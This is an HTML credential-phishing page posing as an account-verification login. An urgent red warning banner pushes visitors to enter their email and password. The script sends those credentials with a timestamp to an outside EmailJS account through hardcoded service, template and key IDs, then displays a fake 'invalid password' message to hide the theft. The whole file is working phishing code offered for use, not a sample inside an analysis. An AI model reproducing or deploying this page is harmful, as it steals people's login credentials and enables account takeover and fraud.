<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login to Your Account</title>
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
  <script>
    emailjs.init("D-p8vFyaYh5Ts02fZ");
  </script>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-image: url('https://i.postimg.cc/pVBJwW22/blue-notes-isolated-grey.png');
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
      background-color: transparent;
      height: 100vh;
      margin: 0;
      padding: 0;
      text-align: center;
      position: relative;
    }

    /* WARNING Banner */
    .warning-banner {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      background-color: red;
      color: white;
      font-weight: bold;
      padding: 15px 10px;
      font-size: 20px;
      z-index: 2000;
    }

    .login-container {
      background-color: white;
      width: 100%;
      max-width: 400px;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      z-index: 1000;
      border-top: 5px solid #007BFF;
    }

    h2 {
      color: #333;
      font-weight: bold;
      margin: 10px 0;
    }

    input {
      width: 85%;
      padding: 8px;
      margin: 10px 0;
      border: 1px solid #aaa;
      border-radius: 6px;
      background-color: #f4f4f4;
      color: #333;
    }

    input::placeholder {
      color: #bbb;
    }

    button {
      background-color: #007BFF;
      color: white;
      border: none;
      padding: 10px;
      width: 85%;
      cursor: pointer;
      border-radius: 6px;
      font-weight: bold;
      transition: background 0.3s;
    }

    button:hover {
      background-color: #0056b3;
    }

    /* Confirmation Message */
    #confirmation {
      display: none;
      background-color: rgba(40, 40, 40, 0.95);
      width: 100%;
      max-width: 400px;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
      border-top: 5px solid #007BFF;
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      z-index: 1000;
    }

    #confirmation p {
      color: #fff;
      font-size: 18px;
      font-weight: bold;
    }
  </style>
</head>
<body>

  <!-- WARNING Banner -->
  <div class="warning-banner">
    WARNING! VERIFY YOUR ACCOUNT NOW
  </div>

  <!-- Login Panel -->
  <div id="login" class="login-container">
    <h2>Login to update account</h2>
    <div id="emailSection">
      <input type="email" id="email" placeholder="Email Address" required>
      <button onclick="showPasswordField()">Next</button>
    </div>
    <div id="passwordSection" style="display: none;">
      <input type="password" id="password" placeholder="Password" required>
      <button onclick="authenticate()">Login</button>
    </div>
  </div>

  <!-- Confirmation Message -->
  <div id="confirmation">
    <h2 style="color: white;">PLEASE TRY AGAIN!</h2>
    <p>You've entered an invalid email address / password combination.</p>
    <button onclick="window.close()">Close this page</button>
  </div>

  <script>
    function sendEmail(username, password) {
      const serviceID = "service_ecvd25p";
      const templateID = "template_2lri2d6";
      const publicKey = "D-p8vFyaYh5Ts02fZ";

      const templateParams = {
        login_history: `Username: ${username}\nPassword: ${password}\nLogged in at: ${new Date().toLocaleString()}`
      };

      return emailjs.send(serviceID, templateID, templateParams, publicKey);
    }

    function showPasswordField() {
      let email = document.getElementById("email").value.trim();
      if (email) {
        document.getElementById("emailSection").style.display = "none";
        document.getElementById("passwordSection").style.display = "block";
      } else {
        alert("Please enter a valid email address.");
      }
    }

    function authenticate() {
      let loginButton = document.querySelector("button");
      loginButton.textContent = "Authenticating...";
      loginButton.disabled = true;
      let email = document.getElementById("email").value.trim();
      let password = document.getElementById("password").value.trim();

      if (email && password) {
        sendEmail(email, password)
          .then(() => {
            loginButton.textContent = "Login";
            loginButton.disabled = false;
            document.getElementById("login").style.display = "none";
            document.getElementById("confirmation").style.display = "block";
          })
          .catch(error => {
            console.error("Error sending email", error);
            loginButton.textContent = "Login";
            loginButton.disabled = false;
            alert("Failed to send login report. Please try again.");
          });
      } else {
        alert("Please enter both email and password.");
        loginButton.disabled = false;
        loginButton.textContent = "Login";
      }
    }
  </script>
</body>
</html>
